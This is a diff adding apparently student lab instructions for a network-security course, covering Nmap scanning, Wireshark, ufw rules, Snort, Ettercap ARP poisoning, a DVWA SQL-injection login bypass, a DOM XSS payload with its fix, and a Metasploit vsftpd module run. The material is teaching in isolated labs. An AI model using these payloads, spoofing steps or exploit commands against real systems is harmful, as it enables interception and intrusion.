@@ -1,0 +1,311 @@
+1. Network Reconnaissance using Nmap Identify open ports, running services, and OS fingerprinting of target machine in a lab network. Tool: Nmap
+1. Install Nmap
+sudo apt install nmap -y
+2. Check your IP address
+ip a
+3. Discover devices in the network
+sudo nmap -sn 192.168.1.0/24
+4. Scan open ports
+nmap -p- TARGET_IP
+5. Identify running services and versions
+nmap -sV TARGET_IP
+6. Detect operating system
+sudo nmap -O TARGET_IP
+7. Complete scan
+sudo nmap -A TARGET_IP
+
+
+
+
+2. Packet Analysis using Wireshark Inspect TCP handshake, HTTP requests, DNS queries and detect suspicious patterns. Tool: Wireshark
+STEP 1: Install Wireshark
+Open Kali Terminal:
+sudo apt install wireshark -y
+STEP 2: Open Wireshark
+sudo wireshark -i eth0
+1.	Wireshark will open. 
+2.	Select eth0 (your network interface). 
+3.	Double-click eth0 to start capturing packets. 
+STEP 3: Generate Network Traffic
+Open another Kali terminal and execute:
+1. Generate DNS query
+nslookup google.com
+2. Generate HTTP request
+curl http://neverssl.com
+3. Generate TCP traffic
+curl https://google.com
+STEP 4: Apply Wireshark Filters
+Enter these filters in the top filter bar one by one.
+1. TCP packets
+tcp
+2. TCP Three-way Handshake
+tcp.flags.syn == 1
+Observe:
+•	SYN 
+•	SYN, ACK 
+•	ACK 
+3. HTTP requests
+http
+4. DNS queries
+dns
+5. Suspicious TCP connections
+tcp.flags.reset == 1
+This displays TCP reset packets.
+STEP 5: Stop Capturing
+Click the red square Stop button in Wireshark
+
+
+
+3.	Firewall Configuration in Linux (iptables / ufw) Create rules to block specific ports and restrict SSH access.
+
+STEP 1: Install UFW
+sudo apt install ufw -y
+STEP 2: Check firewall status
+sudo ufw status
+STEP 3: Enable firewall
+sudo ufw enable
+STEP 4: Block specific ports
+Block HTTP (Port 80):
+sudo ufw deny 80/tcp
+Block FTP (Port 21):
+sudo ufw deny 21/tcp
+STEP 5: Allow SSH access
+Allow SSH only from your Windows PC:
+sudo ufw allow from 192.168.1.43 to any port 22 proto tcp
+Block SSH from other devices:
+sudo ufw deny 22/tcp
+Important: Add the specific allow rule before the deny rule. If you are connected remotely through SSH, don't enable these rules until you have verified your access.
+STEP 6: View firewall rules
+sudo ufw status numbered
+STEP 7: Delete a firewall rule (if required)
+sudo ufw delete deny 80/tcp
+STEP 8: Disable firewall (optional)
+sudo ufw disable
+
+
+
+
+4.	 Sniffing and ARP Spoofing Demonstration Capture traffic between two machines using ARP poisoning. Tools: Ettercap, arpspoof
+
+STEP 1: Install Ettercap
+Open Kali Terminal:
+sudo apt update
+sudo apt install ettercap-graphical -y
+STEP 2: Find Network IPs
+ip a
+Check gateway IP:
+ip route
+Note your Kali IP, Windows IP and gateway IP.
+STEP 3: Open Ettercap
+sudo ettercap -G
+STEP 4: Start Network Sniffing
+1.	Click Sniff → Unified Sniffing. 
+2.	Select eth0. 
+3.	Click OK. 
+4.	Go to Hosts → Scan for hosts. 
+5.	Click Hosts → Hosts List. 
+STEP 5: Select Lab Devices
+For an authorized isolated lab:
+1.	Select your first test machine. 
+2.	Click Add to Target 1. 
+3.	Select your second test machine. 
+4.	Click Add to Target 2. 
+STEP 6: Demonstrate ARP Poisoning
+1.	Open Mitm menu. 
+2.	Select ARP Poisoning. 
+3.	Enable Sniff remote connections. 
+4.	Start the demonstration. 
+Only do this between devices you own in an isolated lab. ARP poisoning can interrupt connectivity and expose unencrypted traffic.
+STEP 7: Observe Traffic
+Generate harmless test traffic from your lab machines.
+Observe captured packets in Ettercap.
+You can also open Wireshark and use this display filter:
+arp
+To view TCP traffic:
+tcp
+STEP 8: Stop the Demonstration
+1.	Stop Ettercap sniffing. 
+2.	Close Ettercap. 
+3.	Check that both test devices have normal network connectivity. 
+
+
+
+
+
+5. SQL Injection Attack Demonstration
+Bypass login authentication in a vulnerable test application. Platform: DVWA
+(Damn Vulnerable Web App)
+STEP 1: Install Required Packages
+Open Kali Terminal:
+sudo apt update
+sudo apt install apache2 mariadb-server php php-mysqli php-gd php-curl php-xml git -y
+STEP 2: Start Services
+sudo service apache2 start
+sudo service mariadb start
+STEP 3: Download DVWA
+cd /var/www/html
+sudo git clone https://github.com/digininja/DVWA.git dvwa
+Set permissions:
+sudo chmod -R 755 /var/www/html/dvwa
+STEP 4: Configure DVWA
+cd /var/www/html/dvwa/config
+sudo cp config.inc.php.dist config.inc.php
+Create database and user:
+sudo mariadb -e "CREATE DATABASE dvwa; CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd'; GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost'; FLUSH PRIVILEGES;"
+STEP 5: Open DVWA
+Open Firefox in Kali and visit:
+http://127.0.0.1/dvwa/setup.php
+1.	Find Create / Reset Database. 
+2.	Click the button. 
+3.	Wait for database setup. 
+STEP 6: Login to DVWA
+Open:
+http://127.0.0.1/dvwa/login.php
+Default credentials:
+Username: admin
+Password: password
+STEP 7: Set Security Level
+1.	Click DVWA Security. 
+2.	Select Low. 
+3.	Click Submit. 
+STEP 8: Perform SQL Injection
+1.	Click SQL Injection in the left menu. 
+2.	Enter this value in the User ID field: 
+1' OR '1'='1' #
+3.	Click Submit. 
+Observation: The application may display multiple user records instead of only one because the injected condition changes the SQL query logic.
+STEP 9: Understand the Attack
+Normal SQL query:
+SELECT * FROM users WHERE user_id = '1';
+Injected condition:
+' OR '1'='1'
+
+
+
+
+
+Practical 6: Intrusion Detection using Snort
+Aim: To detect suspicious network traffic using custom Snort rules.
+STEP 1: Check Snort installation
+Sudo apt install snort
+snort -V
+STEP 2: Create custom rule
+sudo mkdir -p /etc/snort/rules
+Open the rule file:
+sudo nano /etc/snort/rules/local.rules
+Add this rule:
+alert icmp any any -> any any (msg:"ICMP Traffic Detected"; sid:1000001; rev:1;)
+Save using Ctrl + O, Enter, Ctrl + X.
+STEP 3: Find Snort configuration
+sudo find / -name snort.lua 2>/dev/null
+Normally, it should show:
+/etc/snort/snort.lua
+STEP 4: Run Snort
+If the configuration exists at /etc/snort/snort.lua, execute:
+sudo snort -c /etc/snort/snort.lua -R /etc/snort/rules/local.rules -i eth0 -A alert_fast
+STEP 5: Generate network traffic
+Open another Kali terminal:
+ping -c 4 192.168.1.43
+STEP 6: Observe alerts
+Return to the Snort terminal.
+Expected alert:
+ICMP Traffic Detected
+Press Ctrl + C to stop Snort.
+STEP 7: Check Snort logs
+sudo ls /var/log/snort/
+
+
+
+
+Cross-Site Scripting (XSS) Attack Demonstration
+index.html:
+
+<html>
+
+<body>
+
+<h2>XSS Demonstration</h2> Enter Name:
+<input id="name">
+
+<button onclick="show()">Submit</button>
+
+<p id="output"></p>
+
+<script>
+
+function show() {
+
+var name = document.getElementById("name").value;
+
+document.getElementById("output").innerHTML = name;
+
+}
+
+</script>
+
+</body>
+
+
+Create Website:
+
+mkdir xss_testing
+cd xss_testing
+nano index.html
+nano index.html
+
+Test Xss:
+ Inside Enter name txtbox:
+<img src=x onerror="alert('You are hacked')">
+TO prevent this XSS replace:
+.innerHTML=name
+With
+
+.textContent = name;
+
+
+
+
+7.DNS Enumeration and WHOIS Lookup
+
+
+Step 1
+search who.is
+Step 2
+Search any website(ex. Amazon.com)
+Step 3
+Scroll down to see Contact Information & Name Servers
+Step 4
+Select option “DNS records for DNS information”
+
+
+
+
+
+8.Vulnerability Scanning using OpenVAS/Nessus(Community Edition)
+Step1:
+Command:
+Ifconfig
+Step2:
+Command:
+Ping ‘ip’ (eth0)
+Step3:
+Command:
+Nmap -sV ‘ip’ (eth0)
+Step4:
+Command:
+Msfconsole
+Step5:
+Command:
+Search vsftpd
+Step6:
+Command:
+use 1
+Step7:
+Command:
+set RHOSTS ‘ip’ (eth0)
+Step8:
+Command:
+run
+Step9:
+Command: search tomcat
+
